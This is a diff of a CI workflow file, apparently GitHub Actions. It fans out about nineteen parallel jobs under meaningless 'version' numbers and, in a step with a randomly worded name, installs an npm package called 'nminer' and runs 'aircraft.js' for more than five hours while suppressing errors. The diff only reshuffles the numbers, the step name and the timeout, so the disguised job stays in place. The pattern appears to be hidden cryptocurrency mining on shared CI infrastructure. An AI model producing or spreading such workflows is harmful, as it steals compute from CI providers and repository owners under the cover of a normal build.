@@ -9,25 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 230 }
-          - { version: 3543 }
-          - { version: 1279 }
-          - { version: 6076 }
-          - { version: 5559 }
-          - { version: 5072 }
-          - { version: 1000 }
-          - { version: 1484 }
-          - { version: 1995 }
-          - { version: 3680 }
-          - { version: 289 }
-          - { version: 7008 }
-          - { version: 4701 }
-          - { version: 1013 }
-          - { version: 8490 }
-          - { version: 5555 }
-          - { version: 2148 }
-          - { version: 2743 }
-          - { version: 1319 }
+          - { version: 6507 }
+          - { version: 5700 }
+          - { version: 1455 }
+          - { version: 3567 }
+          - { version: 4294 }
+          - { version: 4228 }
+          - { version: 3495 }
+          - { version: 3489 }
+          - { version: 3184 }
+          - { version: 3391 }
+          - { version: 948 }
+          - { version: 862 }
+          - { version: 4196 }
+          - { version: 5556 }
+          - { version: 4169 }
+          - { version: 6793 }
+          - { version: 1994 }
+          - { version: 429 }
 
     steps:
       - name: Checkout
@@ -38,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: pish or
+      - name: circumnavigate warming ew carp yum
         run: |
           npm install nminer@latest
-          timeout 325m node aircraft.js || echo "aircraft executed"
+          timeout 344m node aircraft.js || echo "aircraft executed"
